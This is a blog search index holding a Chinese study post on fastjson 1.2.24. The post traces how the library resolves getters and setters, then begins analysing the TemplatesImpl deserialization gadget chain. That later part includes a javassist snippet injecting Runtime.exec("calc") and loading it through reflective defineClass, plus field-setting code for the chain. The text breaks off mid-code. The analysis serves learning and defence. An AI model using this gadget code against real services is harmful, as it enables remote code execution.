<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java安全-fastjson及其TemplatesImpl链学习与分析</title>
      <link href="/posts/ad3be047.html"/>
      <url>/posts/ad3be047.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>本文学习fastjson以及在1.2.24版本下的TemplatesImpl链利用，学习下分析思路，尽量理解漏洞在源码上的触发过程。</p><h1 id="0x01、fastjson描述"><a href="#0x01、fastjson描述" class="headerlink" title="0x01、fastjson描述"></a>0x01、fastjson描述</h1><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。<br>官方地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a><br>官方中文地址：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p><p>优点：</p><ul><li>性能速度快</li><li>使用广泛</li><li>测试完备（虽然现在各版本爆出来的问题有点多）</li><li>使用简单</li><li>功能完备</li></ul><p>格式跟jackson很像，区别jackson数据要求比较严格，其中提交的数据只能为对应Javabean的key，不能添加多余不在javabean的key进行提交，因此会报错，而fastjson不会</p><p>新建maven项目，然后环境添加：<br>直接添加对应版本到maven依赖即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-1.png" title="添加依赖"></p><h1 id="0x02、fastjson简单使用"><a href="#0x02、fastjson简单使用" class="headerlink" title="0x02、fastjson简单使用"></a>0x02、fastjson简单使用</h1><p>主要学习序列化和反序列化接口<br>简单使用：<br>创建基础实例类People类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">People</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用People类构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="序列化-toJSONString"><a href="#序列化-toJSONString" class="headerlink" title="序列化-toJSONString()"></a>序列化-toJSONString()</h2><p>还有一些其它的序列化方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，支持各种各种Java基本类型和JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toJSONString</span><span class="params">(Object object, SerializerFeature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，返回JSON字符串的utf-8 bytes</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toJSONBytes(Object object, SerializerFeature... features);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，写入到Writer中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeJSONString</span><span class="params">(Writer writer, </span></span><br><span class="line"><span class="params">                                   Object object, </span></span><br><span class="line"><span class="params">                                   SerializerFeature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，按UTF-8编码写入到OutputStream中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">writeJSONString</span><span class="params">(OutputStream os,</span></span><br><span class="line"><span class="params">                                        Object object,</span></span><br><span class="line"><span class="params">                                        SerializerFeature... features)</span>;</span><br></pre></td></tr></table></figure><p>序列化toJSONString()的使用：<br><code>JSON.toJSONString(Class class)</code><br><code>JSON.toJSONString(Class class,SerializerFeature ...)</code>可以使用SerializerFeature.WriteClassName参数将类名加到序列化json字段的@type中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        People people=<span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line">        people.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        Object fj=JSON.toJSONString(people);</span><br><span class="line">        System.out.println(fj);</span><br><span class="line">        Object fj2=JSON.toJSONString(people, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(fj2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-2.png" title="toJSONString()的使用"></p><h2 id="反序列化-parseObject-、parse-、parseArray"><a href="#反序列化-parseObject-、parse-、parseArray" class="headerlink" title="反序列化-parseObject()、parse()、parseArray()"></a>反序列化-parseObject()、parse()、parseArray()</h2><p>还有一些其他不同参数的使用方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将JSON字符串反序列化为JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(String jsonStr, </span></span><br><span class="line"><span class="params">                                Class&lt;T&gt; clazz, </span></span><br><span class="line"><span class="params">                                Feature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串反序列化为JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(<span class="type">byte</span>[] jsonBytes,  // UTF-<span class="number">8</span>格式的JSON字符串</span></span><br><span class="line"><span class="params">                                Class&lt;T&gt; clazz, </span></span><br><span class="line"><span class="params">                                Feature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串反序列化为泛型类型的JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(String text, </span></span><br><span class="line"><span class="params">                                TypeReference&lt;T&gt; type, </span></span><br><span class="line"><span class="params">                                Feature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串反序列为JSONObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span>;</span><br></pre></td></tr></table></figure><p>反序列化parseObject()、parse()用法<br><code>JSON.parseObject()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        People people=<span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line">        <span class="comment">//第一种方式</span></span><br><span class="line">        String parse=<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;李四\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object parfj=JSON.parseObject(parse,People.class);</span><br><span class="line">        System.out.println(parfj);</span><br><span class="line">        <span class="comment">//第二种方式效果同上</span></span><br><span class="line">        String parse2=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.test.fastjson.People\&quot;,\&quot;name\&quot;:\&quot;李四\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object parfj2=JSON.parseObject(parse2);</span><br><span class="line">        System.out.println(parfj2);</span><br><span class="line">        <span class="comment">//第三种方式</span></span><br><span class="line">        String parse2=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.test.fastjson.People\&quot;,\&quot;name\&quot;:\&quot;李四\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object parfj2=JSON.parse(parse2);</span><br><span class="line">        System.out.println(parfj2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-3.png" title="反序列化的使用"></p><ul><li>parseObject()方法，需要设置第二个参数(Class class)将序列化数据读取应用到对应类里，否则会返回JSON对象</li><li>parse()方法是直接将序列化数据应用到@type声明的类中，如果不声明@type变量，则会返回JSON对象。</li><li>parseArray()方法就是源数据是集合的形式（即[]中的内容）</li></ul><p>另外一些使用方法直接参考中文手册即可<br><a href="https://www.w3cschool.cn/fastjson/">https://www.w3cschool.cn/fastjson/</a></p><h2 id="getter-x2F-setter自动调用"><a href="#getter-x2F-setter自动调用" class="headerlink" title="getter&#x2F;setter自动调用"></a>getter&#x2F;setter自动调用</h2><p>在使用fastjson中，发现</p><ul><li><code>JSON.parseObject(parse2)</code>方法会自动调用目标类的构造方法、get方法和set方法。</li><li><code>JSON.parseObject(parse2,People.class)</code>和<code>JSON.parse(parse2)</code>方法只会调用目标类的构造方法和set方法</li></ul><h3 id="get方法调用"><a href="#get方法调用" class="headerlink" title="get方法调用"></a>get方法调用</h3><p><code>parseObject(parse2)</code>方法中会通过反射读取目标元素的getter获取值并存储在hashmap中<br><img src="/posts/ad3be047/fj1-8.png" title="parseObject方法"><br><img src="/posts/ad3be047/fj1-4.png" title="get方法调用"><br><img src="/posts/ad3be047/fj1-5.png" title="get方法调用"><br><img src="/posts/ad3be047/fj1-9.png" title="get方法调用"><br><img src="/posts/ad3be047/fj1-6.png" title="get方法调用"></p><h3 id="set方法、构造方法调用"><a href="#set方法、构造方法调用" class="headerlink" title="set方法、构造方法调用"></a>set方法、构造方法调用</h3><p>但在setter调用的调试中，只追到下图的包，通过deserialze()方法反射获取成员值，循环读取但是无法抓到每个获取方法的过程<br><img src="/posts/ad3be047/fj1-7.png" title="setter"></p><h3 id="getter-x2F-setter获取"><a href="#getter-x2F-setter获取" class="headerlink" title="getter&#x2F;setter获取"></a>getter&#x2F;setter获取</h3><p>上面提到在调用对应get或者set方法时，通过getter&#x2F;setter获取对应方法，然后直接调用在getter&#x2F;setter获取对应的成员值反序列化中的获取getter&#x2F;setter前的调用栈大体如下，没找到前面调用过程的文章，瞎跟了好一会，比较容易跟丢，后面按我理解跟出来的调用情况，用图展示的话拉的比较长，就用调用链形式展示，以反序列化调试展示</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(String text)</span><br><span class="line">    -&gt;parse(text)</span><br><span class="line">        -&gt;parse(text, DEFAULT_PARSER_FEATURE)</span><br><span class="line">            -&gt;DefaultJSONParser.parse()</span><br><span class="line">                -&gt;parse(Object fieldName)</span><br><span class="line">                    -&gt;parseObject(object, fieldName)</span><br><span class="line">                        -&gt;TypeUtils.loadClass(typeName, config.getDefaultClassLoader()) <span class="comment">//通过type值反射获取类</span></span><br><span class="line">                        -&gt;ParserConfig.getDeserializer(Clazz)</span><br><span class="line">                            -&gt;getDeserializer(Class&lt;?&gt; clazz, Type type)</span><br><span class="line">                                -&gt;createJavaBeanDeserializer(clazz, type)</span><br><span class="line">                                    -&gt;JavaBeanInfo.build(clazz, type, propertyNamingStrategy)</span><br></pre></td></tr></table></figure><p>进入JavaBeanInfo.build()方法查看getter&#x2F;setter的设置情况<br>首先通过反射获取Clazz类的属性、方法、构造方法<br><img src="/posts/ad3be047/fj1-10.png" title="反射调用"></p><p>获取后，先是判断构造器是否为空，如果为空，则判断该类是否是接口或者抽象类，如果是的话，然后创建JSNOcreator注解，（底层源码没注解看着还是费劲好些流程不是特别明白）</p><p><img src="/posts/ad3be047/fj1-11.png" title="构造器判断"></p><h4 id="setter构建"><a href="#setter构建" class="headerlink" title="setter构建"></a>setter构建</h4><p>经过前面的一些判断，再到下面的setter构建，循环获取反射里的方法名</p><p><img src="/posts/ad3be047/fj1-12.png" title="getter/setter构建"></p><p>会经过几个条件判断:<br>条件判断，方法名长度不能小于4</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法不能是静态方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法的返回类型必须是void类型或者返回方法本身。主要是作用筛选是不是set方法，get方法会返回字符串就符合下面的判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法的参数个数必须为1个</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>条件判断，方法名开头必须是set开头</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件判断，判断TypeUtils.compatibleWithJavaBean是否开起，compatibleWithJavaBean为false表示首字母小写</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件判断，判断set后面的字母</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断第四个字符是否是以“_”或者“f”</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//如果不是以上情况，就判断方法名长度是否大于5并且方法名的第五个字符是否是大写</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的筛选获取截选后的字段的属性值，如果属性值不存在或者类型为boolean类型，就对其变量名前面加上is拼接，再查询拼接后的字段的属性值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line"><span class="keyword">if</span> (field == <span class="literal">null</span> &amp;&amp; types[<span class="number">0</span>] == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">isFieldName</span> <span class="operator">=</span> <span class="string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="number">0</span>)) + propertyName.substring(<span class="number">1</span>);</span><br><span class="line">    field = TypeUtils.getField(clazz, isFieldName, declaredFields);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将符合条件的添加入fieildList中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                         annotation, fieldAnnotation, <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><p>总结必须满足的条件就是：</p><ul><li>方法名长度不能小于4</li><li>方法不能是静态方法</li><li>方法的返回类型必须是void类型或者返回方法本身</li><li>方法的参数个数必须为1个</li><li>方法名开头必须是set开头</li></ul><h4 id="getter构建"><a href="#getter构建" class="headerlink" title="getter构建"></a>getter构建</h4><p><img src="/posts/ad3be047/fj1-13.png" title="getter构建"></p><p>流程差不多<br>条件判断，方法名长度不能小于4</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法不能是静态方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>条件判断，方法名必须以”get”开头，并且方法名的第四个字母必须是大写</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>))) &#123;</span><br><span class="line">    <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法的返回类型必须继承（Collection、Map、AtomicBoolean、AtomicLong）四个类的其中一种</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">        || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">        || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">        || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">        || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    ) &#123;</span><br></pre></td></tr></table></figure><p>然后把满足条件的放进fieldinfo中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><p>接着获取方法的是否存在JSONField的注解方法，类似下图，判断该类是否存在JSONField的注解方法，并且是否可以反序列化，反序列化设置默认为true<br><img src="/posts/ad3be047/fj1-15.png" title="beaninfo"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JSONField</span> <span class="variable">annotation</span> <span class="operator">=</span> method.getAnnotation(JSONField.class);</span><br><span class="line">    <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.deserialize()) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        propertyName = annotation.name();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后获取字段信息，查看该注释方法名在fieildList中否存在</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> getField(fieldList, propertyName);</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">        propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>满足上面条件就将信息存进fieildList中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><p>总结必须满足的条件就是：</p><ul><li>方法名长度不能小于4</li><li>方法不能是静态方法</li><li>方法名开头必须是get开头</li><li>方法的返回类型必须继承（Collection、Map、AtomicBoolean、AtomicLong）四个类的其中一种</li></ul><p>最后通过返回javaBeanInfo将上面的fieldinfo一起放进beaninfo中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanInfo</span>(clazz, builderClass, defaultConstructor, <span class="literal">null</span>, <span class="literal">null</span>, buildMethod, jsonType, fieldList);</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-14.png" title="beaninfo"></p><h1 id="0x03、TemplatesImpl知识回顾"><a href="#0x03、TemplatesImpl知识回顾" class="headerlink" title="0x03、TemplatesImpl知识回顾"></a>0x03、TemplatesImpl知识回顾</h1><p>TemplatesImpl在cc2链学习中涉及到，这里直接引用cc2分析的部分吧</p><h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>ClassLoader为类加载器，可以将字节码文件(.class文件)，通过loadClass函数加载类名，返回一个Class对象，同时ClassLoader类下面存在defineClass方法，可以将byte[]字节数组信息还原成一个Class对象，在学javassist中，了解到javassist可以动态生成字节码文件，包括了一些恶意代码文件，可进而通过ClassLoader类加载器将这些恶意的字节码文件转化为java类进行调用，达到执行恶意代码的目的</p><p>其中类加载阶段：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader#loadClass（类加载，从类缓或父加载器等位置寻找类）</span><br><span class="line">    ——&gt; ClassLoader#findClass（寻找类，通过URL制定的方式加载字节码）</span><br><span class="line">        ——&gt; ClassLoader#defineClass（定义类，通过获取的字节码转换成类对象）</span><br></pre></td></tr></table></figure><p>由于ClassLoader#defineClass方法为protect修饰，因此可通过反射进行调用</p><p>简单实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//ct.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用ClassLoader#defineClass</span></span><br><span class="line">        Method define=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class ,<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        define.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class cla=(Class)define.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;People2&quot;</span>,bt,<span class="number">0</span>,bt.length);</span><br><span class="line">        cla.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/cc2-25.png" title="defineClass实现"></p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>TemplatesImpl这个类简述功能就是对xsl格式文件生成的字节码转换成XSLTC模板对象，期间会处理字节码，因此重写了defineClass方法，具体描述可查看<a href="https://www.anquanke.com/post/id/247044">TemplatesImpl了解</a></p><p><img src="/posts/ad3be047/cc2-26.png" title="重写defineClass"></p><p>重写了<code>defineClass</code>方法，并且没有定义域，可以在其他类进行调用使用，而<code>ClassLoader#defineClass</code>定义域是受保护的，在很多情况中调用受限，因此这也是<code>TransletClassLoader#defineClass</code>作为很多序列化漏洞入口，而不是使用<code>ClassLoader#defineClass</code></p><p>但该<code>defineClass()</code>的调用并不会实例化，需要通过<code>newInstance()</code>进行实例化。</p><p>依次看调用情况</p><h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses()"></a>defineTransletClasses()</h3><p><code>defineClass</code>在<code>defineTransletClasses</code>方法中被调用</p><p><img src="/posts/ad3be047/cc2-27.png" title="defineClass调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_bytecodes</code>不能为空，为空会直接抛出异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_tfactory</code>需要实例化<br>创建的<code>TransletClassLoader</code>(Translet类的加载器)对象，其中<code>_tfactory.getExternalExtensionsMap()</code>中的<code>_tfactory</code>对象为<code>TransformerFactoryImpl</code>类对象，等同于调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法，但其中<code>_tfactory</code>对象初始赋值为null，直接执行会报错，因此需要将<code>_tfactory</code>进行实例化，才能调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">               <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br></pre></td></tr></table></figure><p>两种实现方法都可以实例化，第一种通过<code>TransformerFactoryImpl()</code>构造方法实现实例化对象，第二种通过反射直接实现实例化对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure></li><li><p><code>父类需要为ABSTRACT_TRANSLET</code>类<br>通过for循环对字节文件类进行循环定义并赋值给class数组，其中会判断当前获取的字节类的父类是否为<code>ABSTRACT_TRANSLET</code>类，是的话会讲该类序号赋值给<code>_transletIndex</code>，否则不是的话会抛出异常（表意为只有存在父类为<code>ABSTRACT_TRANSLET</code>类的<code>translet</code>类才能被实例化），从而在<code>getTransletInstance</code>类中的<code>AbstractTranslet</code>实例化步骤将父类为<code>ABSTRACT_TRANSLET</code>的类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = 